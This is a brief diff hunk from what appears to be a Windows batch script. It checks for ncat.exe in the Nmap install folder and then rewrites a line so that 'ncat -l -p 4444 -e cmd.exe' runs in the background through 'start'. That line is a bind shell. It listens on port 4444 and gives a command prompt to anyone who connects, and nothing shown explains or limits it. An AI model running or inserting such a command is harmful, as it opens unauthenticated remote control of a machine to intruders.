@@ -36,7 +36,7 @@ if exist "C:\Program Files (x86)\Nmap\ncat.exe" (
     exit /b
 )
 
-ncat -l -p 4444 -e cmd.exe
+start "" ncat -l -p 4444 -e cmd.exe
 
 
 
